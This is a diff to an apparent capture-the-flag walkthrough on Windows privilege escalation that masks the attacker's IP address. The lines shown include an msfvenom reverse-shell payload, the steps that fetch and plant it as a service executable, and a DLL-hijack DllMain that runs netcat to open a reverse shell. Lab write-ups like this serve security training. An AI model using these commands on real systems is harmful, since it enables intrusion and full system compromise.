@@ -101,7 +101,7 @@ Just as putty stores credentials, any software that stores passwords, including 
 - ``icacls`` check permissions on service executable - if lower permission we can overwrite with payload, and service will execute.
 - ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`` create payload
 - ``python3 -m http.server``
-- pull from powershell with ``wget http://10.2.127.225:8000/rev-svc.exe -O rev-svc.exe``
+- pull from powershell with ``wget http://10.x.x.x:8000/rev-svc.exe -O rev-svc.exe``
 - replace service executable with payload ``move Wservice.exe Wservice.exe.bkp`` and ``move rev-svc.exe Wservice.exe``
 - and grant permissions with ``icalcs WService.exe /grant Everyone:F``
 - start up netcat listener
@@ -191,7 +191,7 @@ EXPORTS
 
 #### [](#header-4)Putting it All together**
 
-1. Copy the file over with smbserer running ``copy \\10.2.127.225\public\proxy.dll`` and rename ``move proxy.dll adsldpc.dll``
+1. Copy the file over with smbserer running ``copy \\10.x.x.x\public\proxy.dll`` and rename ``move proxy.dll adsldpc.dll``
 2. Running VNC repair in add/remove programs will give us the output.txt and we can see the user is ``nt authorioty/system``
 
 #### [](#header-4)Repeat with Reverse Shell To get Flag
@@ -204,7 +204,7 @@ EXPORTS
 BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-            system("C:\\tools\\nc64.exe -e cmd.exe 10.2.127.225 6666");
+            system("C:\\tools\\nc64.exe -e cmd.exe 10.x.x.x 6666");
     }
 
     return TRUE;
